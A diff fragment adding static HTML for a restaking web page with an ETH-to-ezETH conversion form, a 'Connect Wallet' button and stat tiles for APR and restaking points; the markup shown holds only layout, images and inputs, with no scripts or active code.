+                                    class="bg-fg-light dark:bg-app-dark flex w-full flex-col items-center justify-start space-y-8 rounded-2xl p-4 md:p-6 dark:shadow-[0px_0px_2000px_0px_rgba(255,255,255,0.13)]">
+                                    <div class="flex w-full flex-col items-center justify-center space-y-8">
+                                        <div class="flex w-full flex-col items-start justify-start gap-3">
+                                            <div
+                                                class="inline-flex items-center justify-between self-stretch text-xs font-normal text-gray-500">
+                                                <div class="flex flex-row items-center justify-start space-x-6">
+                                                    <p
+                                                        class="pb-[3px] text-base leading-none text-slate-900 dark:text-zinc-300">
+                                                        Restake</p>
+                                                </div>
+                                                <div class="flex items-center gap-x-1 leading-none">Balance: 0.00</div>
+                                            </div>
+                                            <div
+                                                class="bg-app-light dark:bg-app-dark flex flex-row items-center justify-start self-stretch rounded-xl dark:border dark:border-gray-700">
+                                                <div
+                                                    class="flex w-[150px] items-center justify-center gap-2 self-stretch border-r border-gray-400 border-opacity-40 px-3.5 py-5 dark:border-gray-500 dark:border-opacity-50">
+                                                    <div class="relative"><button
+                                                            class="relative flex flex-row items-center justify-start gap-2 px-1">
+                                                            <div class="relative"><span
+                                                                    class="relative flex items-center justify-center overflow-hidden"
+                                                                    style="width: 27px; height: 27px;"><img
+                                                                        alt="Ethereum icon" fetchpriority="high"
+                                                                        width="27" height="27" decoding="async"
+                                                                        data-nimg="1" class="size-full rounded-full"
+                                                                        src="/tokens/ETH.svg"
+                                                                        style="color: transparent;"><span
+                                                                        class="flex items-center justify-center overflow-hidden border-background absolute bottom-0 right-0 rounded-full border"
+                                                                        style="width: 12px; height: 12px;"><img
+                                                                            alt="Ethereum icon" fetchpriority="high"
+                                                                            width="12" height="12" decoding="async"
+                                                                            data-nimg="1" class="size-full rounded-full"
+                                                                            src="/_next/static/media/ethereum.16f30881.svg"
+                                                                            style="color: transparent;"></span></span>
+                                                            </div>
+                                                            <div class="text-md font-medium md:text-lg">ETH</div><svg
+                                                                xmlns="http://www.w3.org/2000/svg" width="14" height="8"
+                                                                viewBox="0 0 14 8" fill="none"
+                                                                class="size-3 text-gray-400 dark:text-opacity-50">
+                                                                <path
+                                                                    d="M12.9258 1.16797L6.92578 7.16797L0.925781 1.16797"
+                                                                    stroke="#8C90A5" stroke-width="1.5"
+                                                                    stroke-linecap="round" stroke-linejoin="round">
+                                                                </path>
+                                                            </svg>
+                                                        </button></div>
+                                                </div>
+                                                <div
+                                                    class="flex flex-1 flex-col items-center justify-center self-stretch px-3.5 py-5">
+                                                    <div
+                                                        class="flex w-full flex-row items-center justify-between self-stretch border-b border-gray-400 border-opacity-40 py-2.5 dark:border-gray-500 dark:border-opacity-50">
+                                                        <input
+                                                            class="w-full self-stretch border-none bg-transparent pr-2 text-xl font-normal text-slate-900 focus:outline-none dark:text-slate-300 [&amp;::-webkit-inner-spin-button]:appearance-none [&amp;::-webkit-outer-spin-button]:appearance-none"
+                                                            placeholder="0.00" min="0" autocomplete="off" type="number"
+                                                            value="">
+                                                    </div>
+                                                    <div
+                                                        class="flex items-start justify-start self-stretch py-1 text-xs text-neutral-400 dark:text-neutral-300">
+                                                        $0.00</div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="flex w-full flex-col items-center justify-center">
+                                            <div class="flex w-full flex-col items-start justify-start gap-3">
+                                                <div
+                                                    class="inline-flex items-center justify-between self-stretch text-xs font-normal text-gray-500">
+                                                    <div class="flex flex-row items-center justify-start space-x-6">
+                                                        <p
+                                                            class="pb-[3px] text-base leading-none text-slate-900 dark:text-zinc-300">
+                                                            Receive</p>
+                                                    </div>
+                                                    <div class="flex items-center gap-x-1 leading-none">Balance: 0.00
+                                                    </div>
+                                                </div>
+                                                <div
+                                                    class="bg-app-light dark:bg-app-dark flex flex-row items-center justify-start self-stretch rounded-xl dark:border dark:border-gray-700">
+                                                    <div
+                                                        class="flex w-[150px] items-center justify-center gap-2 self-stretch border-r border-gray-400 border-opacity-40 px-3.5 py-5 dark:border-gray-500 dark:border-opacity-50">
+                                                        <div class="relative"><button disabled=""
+                                                                class="relative flex flex-row items-center justify-start gap-2 px-1">
+                                                                <div class="relative"><span
+                                                                        class="relative flex items-center justify-center overflow-hidden"
+                                                                        style="width: 27px; height: 27px;"><img
+                                                                            alt="Renzo Restaked ETH icon"
+                                                                            fetchpriority="high" width="27" height="27"
+                                                                            decoding="async" data-nimg="1"
+                                                                            class="size-full rounded-full"
+                                                                            src="/tokens/ezETH.svg"
+                                                                            style="color: transparent;"><span
+                                                                            class="flex items-center justify-center overflow-hidden border-background absolute bottom-0 right-0 rounded-full border"
+                                                                            style="width: 12px; height: 12px;"><img
+                                                                                alt="Ethereum icon" fetchpriority="high"
+                                                                                width="12" height="12" decoding="async"
+                                                                                data-nimg="1"
+                                                                                class="size-full rounded-full"
+                                                                                src="/_next/static/media/ethereum.16f30881.svg"
+                                                                                style="color: transparent;"></span></span>
+                                                                </div>
+                                                                <div class="text-md font-medium md:text-lg">ezETH</div>
+                                                            </button></div>
+                                                    </div>
+                                                    <div
+                                                        class="flex flex-1 flex-col items-center justify-center self-stretch px-3.5 py-5">
+                                                        <div
+                                                            class="flex w-full flex-row items-center justify-between self-stretch border-b border-gray-400 border-opacity-40 py-2.5 dark:border-gray-500 dark:border-opacity-50">
+                                                            <input
+                                                                class="w-full self-stretch border-none bg-transparent pr-2 text-xl font-normal text-slate-900 focus:outline-none dark:text-slate-300 [&amp;::-webkit-inner-spin-button]:appearance-none [&amp;::-webkit-outer-spin-button]:appearance-none"
+                                                                placeholder="0.00" min="0" autocomplete="off"
+                                                                disabled="" type="number" value="">
+                                                        </div>
+                                                        <div
+                                                            class="flex items-start justify-start self-stretch py-1 text-xs text-neutral-400 dark:text-neutral-300">
+                                                            $0.00</div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div><button
+                                        class=" interact-button inline-flex items-center justify-center whitespace-nowrap rounded-xl transition-colors focus-visible:outline-none disabled:pointer-events-none disabled:opacity-50 bg-primary-500 hover:bg-primary-600 text-secondary-600 h-12 px-8 font-semibold text-lg w-full">Connect
+                                        Wallet</button>
+                                    <div class="w-full hidden">
+                                        <div></div>
+                                    </div>
+                                </div>
+                                <div
+                                    class="bg-fg-light dark:bg-app-dark font-regular flex w-full flex-col items-center justify-start rounded-2xl px-6 text-[15px] text-gray-500 hover:bg-opacity-70 dark:shadow-[0px_0px_2000px_0px_rgba(255,255,255,0.13)]">
+                                    <div class="flex w-full cursor-pointer flex-row items-center justify-between py-4 ">
+                                        <div class="flex items-center gap-x-1">ezETH = $3,440.78</div><svg
+                                            xmlns="http://www.w3.org/2000/svg" width="14" height="8" viewBox="0 0 14 8"
+                                            fill="none"
+                                            class="text-gray-400 transition-transform duration-300 dark:text-opacity-50">
+                                            <path d="M12.9258 1.16797L6.92578 7.16797L0.925781 1.16797" stroke="#8C90A5"
+                                                stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+                                            </path>
+                                        </svg>
+                                    </div>
+                                    <ul class="MuiList-root size-full css-1uzmcsd">
+                                        <div></div>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class=" interact-button flex-0 relative z-10 block w-full lg:hidden">
+                    <div
+                        class=" dark:bg-fg-dark bg-fg-light border-divider-light dark:border-divider-dark grid grid-cols-2 grid-rows-2 justify-start gap-2 border-t p-2 drop-shadow-2xl lg:relative lg:flex lg:flex-row lg:gap-0 lg:border-t-0  lg:p-4 lg:drop-shadow-none ">
+                        <div
+                            class="flex-1 px-3 text-xs font-normal text-neutral-500 last:border-none md:px-6 lg:flex-auto lg:border-r lg:border-[#181E38] lg:first:pl-0 dark:text-white dark:text-opacity-50">
+                            <div class="flex flex-row items-center space-x-2">
+                                <div class="whitespace-nowrap">Total Value Restaked</div><button data-state="closed"
+                                    class=""><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24"
+                                        stroke-linecap="round" stroke-linejoin="round" height="1em" width="1em"
+                                        xmlns="http://www.w3.org/2000/svg">
+                                        <circle cx="12" cy="12" r="10"></circle>
+                                        <line x1="12" y1="16" x2="12" y2="12"></line>
+                                        <line x1="12" y1="8" x2="12.01" y2="8"></line>
+                                    </svg></button>
+                            </div>
+                            <div class="text-xl font-medium text-zinc-800 dark:text-white dark:text-opacity-100">$0.00
+                            </div>
+                        </div>
+                        <div
+                            class="flex-1 px-3 text-xs font-normal text-neutral-500 last:border-none md:px-6 lg:flex-auto lg:border-r lg:border-[#181E38] lg:first:pl-0 dark:text-white dark:text-opacity-50">
+                            <div class="flex flex-row items-center space-x-2">
+                                <div class="whitespace-nowrap">APR</div><button data-state="closed" class=""><svg
+                                        stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24"
+                                        stroke-linecap="round" stroke-linejoin="round" height="1em" width="1em"
+                                        xmlns="http://www.w3.org/2000/svg">
+                                        <circle cx="12" cy="12" r="10"></circle>
+                                        <line x1="12" y1="16" x2="12" y2="12"></line>
+                                        <line x1="12" y1="8" x2="12.01" y2="8"></line>
+                                    </svg></button>
+                            </div>
+                            <div class="text-xl font-medium text-zinc-800 dark:text-white dark:text-opacity-100">0.00%
+                            </div>
+                        </div>
+                        <div
+                            class="flex-1 px-3 text-xs font-normal text-neutral-500 last:border-none md:px-6 lg:flex-auto lg:border-r lg:border-[#181E38] lg:first:pl-0 dark:text-white dark:text-opacity-50">
+                            <div class="flex flex-row items-center space-x-2">
+                                <div class="whitespace-nowrap">EigenLayer Points</div><button data-state="closed"
+                                    class=""><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24"
+                                        stroke-linecap="round" stroke-linejoin="round" height="1em" width="1em"
+                                        xmlns="http://www.w3.org/2000/svg">
+                                        <circle cx="12" cy="12" r="10"></circle>
+                                        <line x1="12" y1="16" x2="12" y2="12"></line>
+                                        <line x1="12" y1="8" x2="12.01" y2="8"></line>
+                                    </svg></button>
+                            </div>
+                            <div class="text-xl font-medium text-zinc-800 dark:text-white dark:text-opacity-100">
+                                <div class="flex flex-row items-center justify-start gap-1"><img alt="Restaking Points"
+                                        loading="lazy" width="20" height="20" decoding="async" data-nimg="1"
+                                        src="logos/eigenlayer.svg" style="color: transparent;">0.00</div>
+                            </div>
+                        </div>
+                        <div
+                            class="flex-1 px-3 text-xs font-normal text-neutral-500 last:border-none md:px-6 lg:flex-auto lg:border-r lg:border-[#181E38] lg:first:pl-0 dark:text-white dark:text-opacity-50">
+                            <div class="flex flex-row items-center space-x-2">
+                                <div class="whitespace-nowrap">Renzo ezPoints</div><button data-state="closed"
+                                    class=""><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24"
+                                        stroke-linecap="round" stroke-linejoin="round" height="1em" width="1em"
+                                        xmlns="http://www.w3.org/2000/svg">
+                                        <circle cx="12" cy="12" r="10"></circle>
+                                        <line x1="12" y1="16" x2="12" y2="12"></line>
+                                        <line x1="12" y1="8" x2="12.01" y2="8"></line>
+                                    </svg></button>
+                            </div>
+                            <div class="text-xl font-medium text-zinc-800 dark:text-white dark:text-opacity-100">0.00
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div><next-route-announcer style="position: absolute;"></next-route-announcer>
+</body>
+
+</html>
